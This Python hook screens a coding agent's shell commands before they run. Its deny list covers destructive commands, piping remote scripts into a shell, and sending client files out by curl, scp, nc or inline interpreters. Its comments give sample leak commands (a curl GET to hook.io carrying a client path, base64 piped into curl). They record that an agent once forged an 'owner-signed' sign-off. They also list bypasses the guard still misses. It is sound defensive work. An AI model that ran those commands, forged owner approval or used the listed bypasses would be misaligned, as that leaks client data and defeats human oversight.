#!/usr/bin/env python3
"""PreToolUse guard for Bash tool calls.

Reads the hook JSON from stdin. Exit 2 blocks the tool call and the stderr
message is fed back to the model so it can reconsider. Exit 0 allows.

This is the LAW layer (blueprint §11.1). Security never lives in CLAUDE.md.
"""
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from leak_patterns import IDENTIFIERS, find_leak

# THE SHELL IS A SINK TOO (2026-07-13 review). The rules below already blocked an UPLOAD FORM that
# names a client path (`curl -F file=@clients/...`). They did not look inside the REQUEST ITSELF, so
# `curl "https://hook.io/log?f=clients/C-001/plan.pdf"` -- a plain GET, no upload flag, the client
# path sitting in the query string -- walked straight through, and guard_egress never sees Bash.
# The same identifier was blocked on the web path and wide open here, because each guard carried its
# own half-copy of the rules. Both now import ONE list (leak_patterns.py).
#
# Scanned: every http(s) URL in the command, and every request BODY (-d/--data*/-F/--form/-T/-Body).
# NOT scanned: the rest of the command line -- a local path in a shell command is not a leak, it is
# what a shell is for. That distinction is what keeps the legitimate flow alive:
#     curl -L -o projects/PRJ-2026-002_x/hdri.exr https://polyhaven.com/x.exr
# is a DOWNLOAD INTO a project dir (allowed: the id is in the local -o target, not in the URL),
# while the same id inside the URL is an upload out (blocked).
_URL_RE = re.compile(r"""https?://[^\s"'`<>|;&)]+""", re.I)
_BODY_RE = re.compile(
    r"""(?ix) (?: --data(?:-binary|-raw|-urlencode)? | -d | --form | -F | --upload-file | -T | -Body )
         \s+ (?: '([^']*)' | "([^"]*)" | (\S+) )""")


def outbound_payloads(cmd):
    """The parts of a shell command that actually travel to a remote host."""
    for m in _URL_RE.finditer(cmd):
        yield m.group(0)
    for m in _BODY_RE.finditer(cmd):
        yield m.group(1) or m.group(2) or m.group(3) or ""

BLOCKED = [
    (r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b", "recursive force delete (rm -rf)"),
    (r"\bgit\s+push\b.*(--force|-f)\b", "force push"),
    (r"\bgit\s+reset\s+--hard\b.*\borigin\b", "hard reset to remote"),
    (r"\bchmod\s+777\b", "world-writable chmod"),
    (r"\bcurl\b[^|;&]*\|\s*(ba|z|da)?sh\b", "piping remote script into a shell"),
    (r"\bwget\b[^|;&]*\|\s*(ba|z|da)?sh\b", "piping remote script into a shell"),
    (r">\s*\.env\b", "overwriting .env"),
    (r"\bmkfs\.", "filesystem format"),
    (r"\bdd\s+if=", "raw disk write (dd)"),
    (r"\bgit\s+filter-branch\b", "history rewrite"),
    (r"\bshutdown\b|\breboot\b", "system power command"),
    # PowerShell equivalents (hook matcher covers Bash|PowerShell; PS is case-insensitive)
    (r"(?i)\b(remove-item|rm|ri|del|erase)\b[^|;]*\s-(recurse|r)\b[^|;]*\s-(force|fo?)\b",
     "recursive force delete (Remove-Item -Recurse -Force)"),
    (r"(?i)\b(remove-item|rm|ri|del|erase)\b[^|;]*\s-(force|fo?)\b[^|;]*\s-(recurse|r)\b",
     "recursive force delete (Remove-Item -Force -Recurse)"),
    (r"(?i)\b(iex|invoke-expression)\b[^|;]*\b(iwr|invoke-webrequest|invoke-restmethod|curl|wget)\b",
     "executing downloaded script (iex + web request)"),
    (r"(?i)\b(iwr|invoke-webrequest|invoke-restmethod)\b[^;]*\|\s*(iex|invoke-expression)\b",
     "piping web content into Invoke-Expression"),
    (r"(?i)\b(stop-computer|restart-computer)\b", "system power command"),
    (r"(?i)\b(format-volume|clear-disk|initialize-disk)\b", "disk format/initialize"),
    # NotebookLM external-research lane (CLAUDE.md): client data must never reach
    # Google. Generic asks pass; these are the realistic leak vectors (red-teamed
    # 2026-07-02 — all five passed the guard before these patterns existed).
    (r"(?i)\bnotebooklm\b[^\"'|;&]*\bshare\b",
     "notebooklm share (external exposure — no studio use case; unblock via PR)"),
    (r"(?i)\bnotebooklm\b(?=.*(--prompt-file|source\s+add|add-research))"
     r"(?=.*(clients[/\\]|projects[/\\]|_private[/\\]|00_intake|01_brief))",
     "uploading client/project files to NotebookLM"),
    (r"(?i)(clients[/\\]|projects[/\\]|_private[/\\])[^|;&]*\|[^|;&]*\bnotebooklm\b",
     "piping client/project file content into NotebookLM"),
    (r"(?i)\bnotebooklm\b[^|;&]*(\$\(|`)",
     "command substitution into a NotebookLM query (unreviewable content)"),
    (r"(?i)\bnotebooklm\b.*\b(PRJ-\d{4}-\d{3}|C-\d{3})\b",
     "client/project identifier in a NotebookLM command"),
    # NotebookLM was never the only way out. Every EXTERNAL SINK below ships bytes off this
    # machine (cloud judge, image API, DR tools, raw HTTP), and _private/ holds a real
    # designer's CLIENT work (2026-07-12 owner call: local-only, never leaves the machine).
    # The old rules guarded clients/|projects/ against notebooklm ONLY — so `critique.py
    # _private/<client render>.png` or `curl -F file=@clients/...` walked straight through.
    # This closes sink x path for ALL of them. Reading these paths LOCALLY stays free.
    # UPLOAD forms only — `curl -o projects/x.zip` (a download INTO the repo) is legitimate and
    # must keep working; `curl -F file=@_private/...` (a client file going OUT) must not.
    # Each pattern demands a REAL path (a separator + at least one path character) after the
    # directory name: without that, a mere mention of the word `_private` next to a `|` in a
    # grep/sed script false-blocks — which it did, on the first command run after this landed.
    (r"(?i)\b(curl|wget|invoke-webrequest|invoke-restmethod|iwr)\b[^|;&]*"
     r"(-F\b|--form\b|-d\b|--data(-binary|-raw)?\b|-T\b|--upload-file\b|-(In)?File\b|-Body\b|@)"
     r"[^|;&]*(clients|projects|_private)[/\\][\w.\-/\\]+",
     "uploading a client/private file to an external endpoint"),
    (r"(?i)\b(critique|hybrid_render|gemini_\w+|chatgpt_\w+|perplexity_\w+)\.py\b"
     r"[^|;&]*(clients|_private)[/\\][\w.\-/\\]+",
     "passing client/private files to a cloud-model script (critique/render/DR call an API)"),
    (r"(?i)(clients|_private)[/\\][\w.\-/\\]+[^|;&]*\|[^|;&]*"
     r"\b(curl|wget|invoke-webrequest|invoke-restmethod|iwr)\b",
     "piping client/private file content into an HTTP request"),
    # python IS this pipeline's own language (critique.py, hybrid_render, the DR tools are all
    # python, and python3 is partly allow-listed) — so an inline interpreter reading a client file
    # AND opening a network connection is the MOST realistic accidental exfil, not curl. Requires
    # BOTH a client/private path and a network indicator, so `python -c "json.load(open('_private/
    # x'))"` (a legitimate LOCAL read) stays allowed.
    (r"(?i)\b(python3?|node|ruby|perl)\b[^|;&]*\s-(c|e)\b"
     r"(?=[^|;&]*(clients|_private)[/\\])"
     r"(?=[^|;&]*(urlopen|urllib|requests|httpx?|socket|smtplib|ftplib|https?://|\.post\(|upload))",
     "inline interpreter reading a client/private file and opening a network connection"),
    # file-copy / raw-socket sinks that are not HTTP at all
    (r"(?i)\b(scp|rsync|rclone|sftp|nc|ncat|netcat)\b[^|;&]*(clients|_private)[/\\][\w.\-/\\]+",
     "copying a client/private file to a remote host (scp/rsync/rclone/nc)"),
    # OWNER-AUTHORED SIGN-OFF LEDGERS (2026-07-12) — the shell half of the guard_paths rule.
    # SEMANTIC facts (where a zoning line goes; which SKU is really being bought) are OWNER-ONLY, and
    # the owner's signature is what makes the call STICK. Round 4 of the plan reader proved a
    # signature the AGENT composes at run time is worthless: it authored both sides of the check and
    # wrote a 17.5 m² "owner-signed" room off a line the owner never saw. So the signature moved into
    # a ledger the OWNER writes — and blocking Write/Edit alone would be pointless while `echo ... >
    # zoning-signoff.json` or `python -c "open(led,'w')"` walked straight through.
    # READING is untouched (`cat`/`python reader.py --owner-ledger led.json` must keep working); only
    # a ledger appearing as the TARGET of a mutation is blocked.
    (r"(?i)(>>?|\b(tee|mv|move-item|cp|copy-item|rm|remove-item|del|new-item|rename-item|"
     r"set-content|add-content|out-file|clear-content)\b)[^|;&]*"
     r"\b(zoning|sourcing)-signoff\.json\b",
     "writing an OWNER-AUTHORED sign-off ledger (*-signoff.json). The owner signs; the agent reads. "
     "Print the canonical key and ask the owner to add the entry"),
    # An inline interpreter's INTENT is not statically decidable (`open(p)` vs `open(p,'w')` is one
    # character), so any `python -c` naming a ledger is refused outright — fail-safe, and cheap:
    # read it with `cat` or the Read tool, which cannot mutate anything.
    # NB the tail is `.*`, not `[^|;&]*`: the FIRST version of this rule used the no-separator class
    # copied from the exfil patterns and a real forgery walked straight through it, because inline
    # python is FULL of semicolons (`import json;d=json.load(...)`). Caught by test_guards.sh.
    (r"(?i)\b(python3?|node|ruby|perl)\b[^|&]*\s-(c|e)\b.*\b(zoning|sourcing)-signoff\.json\b",
     "inline interpreter naming an OWNER-AUTHORED sign-off ledger (its write-intent is undecidable "
     "from the command string). Read it with `cat`; only the owner appends to it"),
]

# HONEST SCOPE (2026-07-12 review): this is a best-effort TRIPWIRE against the agent naively or
# accidentally shipping client/_private data off the machine — it catches the sinks a helpful
# assistant actually reaches for. It is NOT a boundary against a determined adversary: an
# allowlist of sink commands cannot be completed by hand (base64-then-paste, a python module that
# reads its path from a variable, an MCP/WebFetch tool outside Bash scope, etc. all remain).
# The real control is network-egress denial at the sandbox layer; treat these patterns as
# defence-in-depth, not a guarantee.

# --- CONTENT FLOWING INTO A PROGRAM NOBODY NAMED (2026-09-08) ---------------------------------
# Every rule above names its SINK (notebooklm, curl, scp, critique.py ...). Evaluating Fabric that
# day showed the shape, tested against this very file: `cat clients/C-001/x.md | fabric -p summarize`
# passed, `fabric -a _private/x.png` passed, `cat _private/x | base64 | curl -d @-` passed (the
# pipe rule above only looks at the ADJACENT segment) — and so will every binary installed next
# month, because a rule that names the objects it applies to will always exempt the next one (R9b).
# The fix is not one more name on the sink list; it is the inverse list. When protected content
# (an IDENTIFIERS hit: clients/C-NNN, _private/, projects/PRJ-..., 00_intake, a project id) sits
# in a pipeline, EVERY program downstream of it must be one this shell knows stays local, or the
# call is blocked. The same for `< file` redirects and attachment-style flags (-a, --attachment,
# --file, --upload, --input, --body-file, -InFile). PowerShell cmdlets are Verb-Noun and the verb
# decides (Get/Select/Format/... local; Invoke/Send/Publish/Push/Start block; unknown verb blocks).
# A relative script path (./x.sh, scripts/x.py) is this repo's own and passes here — the named
# script rules above still apply to it. A local tool missing from LOCAL_TOOLS costs one line here
# plus a check_allow in scripts/test_guards.sh: that is the cheap direction, and it is deliberate.
# STILL OUT OF SCOPE, said plainly: a relay through a temp file (`cat _private/x > /tmp/y; tool
# < /tmp/y`), a heredoc pasted from memory, and a bare file name that carries no identifier.
LOCAL_TOOLS = set("""
cat head tail grep egrep fgrep rg ag sed awk gawk sort uniq wc cut tr tee less more column paste jq yq
join comm diff cmp find fd ls dir du df stat file basename dirname realpath readlink cygpath od
xxd hexdump strings base64 md5sum sha1sum sha256sum echo printf test true false yes seq sleep
date env printenv export set read mapfile tac rev nl fold fmt pr split csplit shuf tsort iconv
dos2unix unix2dos nproc uname which where type hash cp mv rm mkdir rmdir touch ln chmod clip
python python3 py pytest node ruby perl bash sh zsh pwsh powershell cmd
git blender ffmpeg ffprobe ffplay magick convert identify exiftool pdftotext pdftoppm pdfinfo
pdfimages tesseract 7z zip unzip tar gzip gunzip xz zstd bzip2 code notepad explorer
""".split())
_SHELL_WORDS = {"while", "for", "if", "then", "else", "elif", "do", "done", "fi", "case", "esac",
                "until", "select", "function", "%", "?"}
_WRAPPERS = {"sudo", "doas", "time", "nohup", "exec", "command", "builtin", "nice", "stdbuf",
             "env", "timeout", "&", "(", "{", "!"}
_PS_LOCAL_VERBS = {"get", "select", "where", "foreach", "sort", "format", "out", "measure",
                   "convertfrom", "convertto", "group", "compare", "tee", "set", "add", "write",
                   "export", "import", "test", "split", "join", "new", "remove", "copy", "move",
                   "rename", "clear", "read", "find", "resolve", "expand", "compress", "update"}
_PS_SINK_VERBS = {"invoke", "send", "publish", "push", "connect", "start", "register", "submit"}

_TOKEN_RE = re.compile(r'''"[^"]*"|'[^']*'|\S+''')
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_XARGS_ARG_FLAGS = re.compile(r"^-(n|P|L|s|I|d|a|E|l|max-args|max-procs|delimiter|replace)$")
_REDIRECT_RE = re.compile(r"""(?<![<>0-9])<(?![<(&])\s*("[^"]+"|'[^']+'|[^\s|;&<>]+)""")
_ATTACH_RE = re.compile(
    r"""(?i)(?:^|\s)(?:-a|--attach(?:ment)?s?|--files?|--upload(?:-file)?|--input(?:-file)?|--image|
        --body-file|--data-file|-InFile)(?:=|\s+)@?("[^"]+"|'[^']+'|[^\s|;&]+)""", re.X)


def _split_outside_quotes(s, seps):
    parts, buf, i, q = [], [], 0, None
    while i < len(s):
        c = s[i]
        if q:
            buf.append(c)
            if c == q:
                q = None
            elif c == "\\" and q == '"' and i + 1 < len(s):
                buf.append(s[i + 1])
                i += 1
            i += 1
            continue
        if c in ("'", '"'):
            q = c
            buf.append(c)
            i += 1
            continue
        sep = next((x for x in seps if s.startswith(x, i)), None)
        if sep:
            parts.append("".join(buf))
            buf = []
            i += len(sep)
            continue
        buf.append(c)
        i += 1
    parts.append("".join(buf))
    return parts


def head_of(segment):
    """The program that receives the bytes of a pipe segment, after wrappers. None = nothing."""
    toks = _TOKEN_RE.findall(segment)
    i = 0
    while i < len(toks):
        t = toks[i]
        low = t.lower()
        if _ENV_ASSIGN_RE.match(t) or low in _WRAPPERS or low.strip("(){}!") == "":
            if low == "timeout" and i + 1 < len(toks) and re.match(r"^\d", toks[i + 1]):
                i += 1
            if low == "stdbuf":
                while i + 1 < len(toks) and toks[i + 1].startswith("-"):
                    i += 1
            i += 1
            continue
        if low.startswith(("(", "{")) and len(low) > 1:
            return low.lstrip("({")
        if low == "xargs":
            i += 1
            while i < len(toks) and toks[i].startswith("-"):
                flag = toks[i]
                i += 1
                if _XARGS_ARG_FLAGS.match(flag) and i < len(toks):
                    i += 1
            if i >= len(toks):
                return "echo"          # bare xargs prints
            continue
        return t
    return None


def head_name(token):
    """Bare program name of a head token: quotes off, path off, .exe off, lower-cased.
    -> (name, relative_script) where relative_script means './x.py' / 'scripts/x.sh' style."""
    if token is None:
        return None, False
    t = token.strip("\"'").lstrip("&").strip().rstrip(");}").lstrip("({")
    p = t.replace("\\", "/")
    if "/" in p:
        absolute = p.startswith("/") or re.match(r"^[A-Za-z]:/", p) is not None
        name = p.rstrip("/").rsplit("/", 1)[-1]
        return re.sub(r"\.(exe|cmd|bat|com)$", "", name.lower()), not absolute
    return re.sub(r"\.(exe|cmd|bat|com)$", "", t.lower()), False


def is_local(token):
    name, relative_script = head_name(token)
    if name is None or name == "" or name in _SHELL_WORDS:
        return True
    if relative_script:
        return True                    # a script of this repo; the named-script rules still apply
    if name in LOCAL_TOOLS:
        return True
    m = re.match(r"^([a-z]+)-[a-z][a-z0-9]*$", name)   # PowerShell Verb-Noun
    if m:
        verb = m.group(1)
        if verb in _PS_SINK_VERBS:
            return False
        return verb in _PS_LOCAL_VERBS
    return False


def unknown_downstream(cmd):
    """-> (program_name, how) when protected content reaches a program not known to be local."""
    for pipeline in _split_outside_quotes(cmd, ["&&", "||", ";", "\n"]):
        segs = _split_outside_quotes(pipeline, ["|&", "|"])
        first_hit = None
        for i, seg in enumerate(segs):
            hit = find_leak(seg, (IDENTIFIERS,))
            head = head_of(seg)
            if hit:
                if first_hit is None:
                    first_hit = i
                targets = [m.group(1) for m in _REDIRECT_RE.finditer(seg)]
                targets += [m.group(1) for m in _ATTACH_RE.finditer(seg)]
                if any(find_leak(t, (IDENTIFIERS,)) for t in targets) and not is_local(head):
                    return head_name(head)[0], "reads it through `<` or an attachment-style flag"
            if first_hit is not None and i > first_hit and not is_local(head):
                return head_name(head)[0], "sits downstream of it in a pipe"
    return None

# Paths that must never be touched via shell redirection/moves either.
PROTECTED_PATH_HINTS = [
    "qa/thresholds.yaml",
    "knowledge/codes-th",
    ".claude/settings.json",
    ".gitattributes",
]


def main() -> int:
    try:
        data = json.load(sys.stdin)
    except Exception:
        return 0  # never brick the session on malformed hook input
    cmd = (data.get("tool_input") or {}).get("command", "") or ""

    for pattern, reason in BLOCKED:
        if re.search(pattern, cmd):
            print(
                f"BLOCKED by guard_bash: {reason}. "
                f"This action is prohibited by studio policy. Command: {cmd[:200]}",
                file=sys.stderr,
            )
            return 2

    for payload in outbound_payloads(cmd):
        hit = find_leak(payload, (IDENTIFIERS,))
        if hit:
            print(
                f"BLOCKED by guard_bash: an outbound request in this command carries {hit[1]} "
                f"(matched {hit[0]!r}). CLAUDE.md: client data stays local. Nothing that identifies "
                "a client or project may sit in a URL or a request body. (A local path in the "
                "command is fine -- only what actually travels to the remote host is screened.)",
                file=sys.stderr,
            )
            return 2

    unknown = unknown_downstream(cmd)
    if unknown:
        name, how = unknown
        print(
            f"BLOCKED by guard_bash: client/private/project content {how}, and `{name}` is a "
            f"program no rule knows stays on this machine. Everything downstream of clients/, "
            f"_private/, projects/PRJ-... content must be in LOCAL_TOOLS (.claude/hooks/guard_bash.py) "
            f"or a PowerShell cmdlet with a local verb. If `{name}` is local-only, add its name there "
            f"together with a check_allow in scripts/test_guards.sh (a PR — the hook guards itself); "
            f"if it talks to the network, this block is the point. Command: {cmd[:200]}",
            file=sys.stderr,
        )
        return 2

    lowered = cmd.lower().replace("\\", "/")
    if any(tok in lowered for tok in ("rm ", "mv ", " > ", ">> ", "tee ",
                                      "remove-item", "move-item", "copy-item", "rename-item",
                                      "set-content", "add-content", "out-file", "clear-content",
                                      "new-item")):
        for p in PROTECTED_PATH_HINTS:
            if p.lower() in lowered:
                print(
                    f"BLOCKED by guard_bash: shell mutation of protected path '{p}'. "
                    "Propose changes via PR instead.",
                    file=sys.stderr,
                )
                return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
